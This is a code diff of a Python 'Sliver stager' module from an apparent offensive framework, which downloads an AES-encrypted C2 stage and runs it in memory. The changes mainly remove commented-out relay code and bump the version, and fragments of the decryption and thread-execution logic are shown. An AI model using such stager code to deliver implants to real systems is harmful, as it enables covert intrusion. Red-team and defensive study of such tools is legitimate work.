@@ -1,6 +1,6 @@
 ########################################################
 ### Sliver Module
-### Status: migrated to 082
+### Status: cleaned, 083
 ###
 ########################################################
 
@@ -11,7 +11,6 @@ from utils.winconst import *
 from time import sleep
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
-#import utils.relay as relay
 import requests
 
 CATEGORY    = 'stager'
@@ -26,17 +25,14 @@ def register_arguments(parser):
         grp.add_argument('-s', '--sleep', default=0, type=int, required=False, help='Sleep for x seconds before the stage is executed')
         vrb = parser.add_argument_group('more')
         vrb.add_argument('--headers', default=0, action='store_true', required=False, help='Print stage headers')
-        #vrb.add_argument('--relay', choices=relay.relay_options, help='Relay to module')
         grp2 = parser.add_argument_group('Deprecated, will be removed in a future release')
-        #parser.add_argument('-k', '--keygen', default=0, action='store_true', required=False, help='Generate AES key and iv')
         grp2.add_argument('-ak', '--aes-key', default='', deprecated=True, type=str, required=False, help='[Deprecated] Specify the AES key for decryption')
         grp2.add_argument('-ai', '--aes-iv', default='', deprecated=True, type=str, required=False, help='[Deprecated] Specify the AES IV for decryption')
 
 class module:
     
     Author = 'psycore8'
-    #Description = 'Connect to a Sliver HTTPS listener, download stage and execute'
-    Version = '2.1.6'
+    Version = '2.1.7'
     DisplayName = 'SLIVER-STAGER'
     payload_size = 0
     header_16bytes = ''
@@ -44,8 +40,6 @@ class module:
     requests.packages.urllib3.disable_warnings() 
 
     import gzip
-    # if chain_injection:
-    #      import modules.ntinjection
 
     def msg(self, message_type, ErrorExit=False):
         messages = {
@@ -85,9 +79,6 @@ class module:
         self.headers = headers
         self.aes_key = aes_key
         self.aes_iv = aes_iv
-        # self.relay_command = relay_command
-        # if self.relay_command != None:
-        #      self.relay = True
 
     def aes_decrypt(self, data):
         cipher = Cipher(algorithms.AES(self.aes_key.encode('utf-8')), modes.CBC(self.aes_iv.encode('utf-8')), backend=default_backend())
@@ -159,7 +150,6 @@ class module:
             WaitForSingleObject(ht, -1)
         elif self.relay:
              print('\n')
-             #relay.start_relay(self.relay_command, stage_buffer)
              return stage_buffer
 
 
